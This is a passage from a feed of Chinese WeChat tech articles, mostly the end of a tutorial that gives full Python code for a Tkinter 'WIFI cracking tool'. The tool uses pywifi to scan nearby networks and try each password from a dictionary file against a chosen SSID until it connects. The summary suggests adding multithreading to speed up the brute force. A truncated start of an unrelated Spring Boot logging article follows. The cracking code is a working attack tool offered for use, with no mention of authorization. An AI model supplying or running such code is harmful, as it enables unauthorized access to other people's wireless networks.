测试网卡是否属于断开状态&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        assert self.iface.status() in \&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    def __str__(self):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 自动会调用的函数，返回自身的网卡&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        return &#x27;(WIFI:%s,%s)&#x27; % (self.wifi, self.iface.name())&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 设置窗口&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    def set_init_window(self):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.init_window_name.title(&quot;WIFI破解工具&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.init_window_name.geometry(&#x27;+500+200&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        labelframe = LabelFrame(width=400, height=200, text=&quot;配置&quot;)  # 框架，以下对象都是对于labelframe中添加的&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        labelframe.grid(column=0, row=0, padx=10, pady=10)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.search = Button(labelframe, text=&quot;搜索附近WiFi&quot;, command=self.scans_wifi_list).grid(column=0, row=0)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.pojie = Button(labelframe, text=&quot;开始破解&quot;, command=self.readPassWord).grid(column=1, row=0)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.label = Label(labelframe, text=&quot;目录路径：&quot;).grid(column=0, row=1)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.file = Button(labelframe, text=&quot;添加密码文件目录&quot;, command=self.add_mm_file).grid(column=2, row=1)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_text = Label(labelframe, text=&quot;WiFi账号：&quot;).grid(column=0, row=2)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_mm_text = Label(labelframe, text=&quot;WiFi密码：&quot;).grid(column=2, row=2)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,sticky=W)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 定义树形结构与滚动条&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show=&quot;headings&quot;, columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.configure(yscrollcommand=self.vbar.set)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 表格的标题&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi_tree.bind(&quot;&amp;lt;Double-1&amp;gt;&quot;, self.onDBClick)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.vbar.grid(row=4, column=1, sticky=NS)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 搜索wifi&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    def scans_wifi_list(self):  # 扫描周围wifi列表&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 开始扫描&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        print(&quot;^_^ 开始扫描附近wifi...&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.iface.scan()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        time.sleep(15)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 在若干秒后获取扫描结果&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        scanres = self.iface.scan_results()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 统计附近被发现的热点数量&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        nums = len(scanres)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        print(&quot;数量: %s&quot; % (nums))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 实际数据&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.show_scans_wifi_list(scanres)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        return scanres&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 显示wifi列表&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    def show_scans_wifi_list(self, scans_res):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        for index, wifi_info in enumerate(scans_res):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            self.wifi_tree.insert(&quot;&quot;, &#x27;end&#x27;, values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 添加密码文件目录&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    def add_mm_file(self):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.filename = tkinter.filedialog.askopenfilename()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.get_value.set(self.filename)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # Treeview绑定事件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    def onDBClick(self, event):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.sels = event.widget.selection()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.get_wifi_value.set(self.wifi_tree.item(self.sels, &quot;values&quot;)[1])&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 读取密码字典，进行匹配&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    def readPassWord(self):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.getFilePath = self.get_value.get()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.get_wifissid = self.get_wifi_value.get()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        pwdfilehander = open(self.getFilePath, &quot;r&quot;, errors=&quot;ignore&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        while True:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            try:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                self.pwdStr = pwdfilehander.readline()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                if not self.pwdStr:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    break&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                if self.bool1:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    self.res = &quot;[*] 密码正确！wifi名：%s，匹配密码：%s &quot; % (self.get_wifissid, self.pwdStr)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    self.get_wifimm_value.set(self.pwdStr)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    tkinter.messagebox.showinfo(&#x27;提示&#x27;, &#x27;破解成功！！！&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    print(self.res)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    break&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                else:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    self.res = &quot;[*] 密码错误！wifi名:%s，匹配密码：%s&quot; % (self.get_wifissid, self.pwdStr)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    print(self.res)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                time.sleep(3)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            except:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                continue&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 对wifi和密码进行匹配&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    def connect(self, pwd_Str, wifi_ssid):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 创建wifi链接文件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.profile = pywifi.Profile()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.profile.ssid = wifi_ssid  # wifi名称&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.profile.key = pwd_Str  # 密码&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.iface.connect(self.tmp_profile)  # 链接&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        time.sleep(5)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            isOK = True&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        else:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            isOK = False&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.iface.disconnect()  # 断开&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        time.sleep(1)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 检查断开状态&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        assert self.iface.status() in \&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        return isOK&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;def gui_start():&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    init_window = Tk()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    ui = MY_GUI(init_window)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    print(ui)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    ui.set_init_window()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    init_window.mainloop()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;if __name__ == &quot;__main__&quot;:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    gui_start()&lt;/span&gt;&lt;/code&gt;&lt;/section&gt;&lt;/pre&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;脚本运行效果如下：&lt;/span&gt;&lt;br/&gt;&lt;img data-ratio=&quot;1.0683760683760684&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jy6xqzHf1icfluCMyt5kyMIHWadia1Ed0h44Wiaic8VTLbrk9GukFHXyBO9MuZxF8tocLaQpuOPXkqDgA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;468&quot;/&gt;&lt;br/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;以上基于 Python 的 GUI 图形界面开发库 Tkinter，实际上 Python 的 GUI 编程可以借助 PyQt5 来自动生成 UI 代码。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;相关教程可参见：&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;https://blog.csdn.net/leidawangzi/article/details/110826210&lt;/span&gt;&lt;/section&gt;&lt;h3&gt;&lt;span&gt;总结&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;本文学习了 Python 暴力破解 WIFI 密码的方法、以及 Python GUI 图形化编程的基础使用。所演示的代码的不足在于均没有使用多线程进行 WIFI 连接测试，实际上因为 WIFI 连接测试需要一定的耗时（3-5秒），故使用多线程将能减少暴力破解过程的等待时间。&lt;/section&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;&lt;code&gt;逆锋起笔&lt;/code&gt;是一个专注于程序员圈子的技术平台，你可以收获&lt;code&gt;最新技术动态&lt;/code&gt;、&lt;code&gt;最新内测资格&lt;/code&gt;、&lt;code&gt;BAT等大厂的经验&lt;/code&gt;、&lt;code&gt;精品学习资料&lt;/code&gt;、&lt;code&gt;职业路线&lt;/code&gt;、&lt;code&gt;副业思维&lt;/code&gt;，微信搜索&lt;code&gt;逆锋起笔&lt;/code&gt;关注！&lt;/p&gt;&lt;/blockquote&gt;&lt;/section&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzUyMzM2ODUwMA==&amp;amp;mid=2247494912&amp;amp;idx=1&amp;amp;sn=c1f2dfe8d5c1e5aa72ceb8aafb2cec4b&amp;amp;chksm=fa3f0c5bcd48854de4fdf5185e877ba589424da444144dac6ae5566c0582517a63a5c2d3352f&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;IntelliJ IDEA 超级牛逼插件推荐&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzUyMzM2ODUwMA==&amp;amp;mid=2247494888&amp;amp;idx=1&amp;amp;sn=28b95b3b9c4c4513d7839567ecf520df&amp;amp;chksm=fa3f0db3cd4884a5251f37e4e3b031de678f5027976d2429a95e46e7e1123381eb61f167180c&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;推荐：本文把 TCP/IP 讲绝了！&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzUyMzM2ODUwMA==&amp;amp;mid=2247494903&amp;amp;idx=2&amp;amp;sn=0e4d315c2ecfb3a9500977868f4c6787&amp;amp;chksm=fa3f0daccd4884bad17965d6a8ed59fc3ad5940e82b47b2acb572bdb3020782811794464206e&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;2 种实现图片加水印的方式&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzUyMzM2ODUwMA==&amp;amp;mid=2247494903&amp;amp;idx=1&amp;amp;sn=687afad7c9da05d945a1a8e6947a8e9b&amp;amp;chksm=fa3f0daccd4884ba2f8bbc1f4f8fbcf76ba3a3f3b0f193d9cd47dd0bbf865539a2bef948126a&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;苹果 iPhone 13 内置原生壁纸下载&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzUyMzM2ODUwMA==&amp;amp;mid=2247494912&amp;amp;idx=2&amp;amp;sn=5c8cdd25c37545d41c10bfd674b3b042&amp;amp;chksm=fa3f0c5bcd48854da566acb29e459fe06763da3f7d94fee32dce1546d2111cfd8ed9281a8b03&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;花里胡哨的 JS 装逼大法，直呼内行！！&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;section&gt;&lt;section powered-by=&quot;xiumi.us&quot;&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;span&gt;&lt;section&gt;&lt;span&gt;&lt;strong&gt;推荐↓↓↓&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;/span&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzUyMzM2ODUwMA==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/hs540iaTKoaIWQB73gicJGTicpAjbSjAjic3d4ytEoiaArkWw6hKMqicPSXrpd4FquTTdStuMoILtqGHS222lIQlh1mg/0?wx_fmt=png&quot; data-nickname=&quot;逆锋起笔&quot; data-alias=&quot;readdot&quot; data-signature=&quot;全网最新编程视频教程、大佬们推荐的 pdf 学习资料，全部免费分享！来到这里，你不懂程序都难。&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;‍&lt;/span&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;‍&lt;/span&gt;&lt;/p&gt;
                &lt;/div&gt;

                

                



                
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>995a0ec45bd7446e3b1d077fcb380791</guid>
<title>Spring Boot + MDC 实现全链路调用日志跟踪，这才叫优雅！</title>
<link>https://toutiao.io/k/m3m8mgg</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content &quot; id=&quot;js_content&quot;&gt;
                    

                    
                    
                    
                    &lt;p data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;span&gt;&lt;span&gt;点击下方“&lt;/span&gt;&lt;span&gt;IT牧场&lt;/span&gt;&lt;span&gt;”，选择“设为星标”&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzI4ODQ3NjE2OA==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/C93dCHmGrWy2s7mVRlKoQM9ib4kthJ3S8oSFyqIqLTNJicVlGnRgUmXCFyH7lGE8TqCC0LYDGnum3ZIHqT3ubsDA/0?wx_fmt=png&quot; data-nickname=&quot;IT牧场&quot; data-alias=&quot;itmuch_com&quot; data-signature=&quot;IT牧场公众号，BAT 技术专家分享开发、架构、运维相关干货！&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-galleryid=&quot;132800459919351808&quot; data-gallerysupplier=&quot;5&quot; data-ratio=&quot;0.6669921875&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/C93dCHmGrWxb4XZdqcOFONK9tGXyWiaQkvKCJgeqSY9tezGTWvjwQao9XlLG5FkeTRydbhWsj5DVyXTibshjAE2A/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; 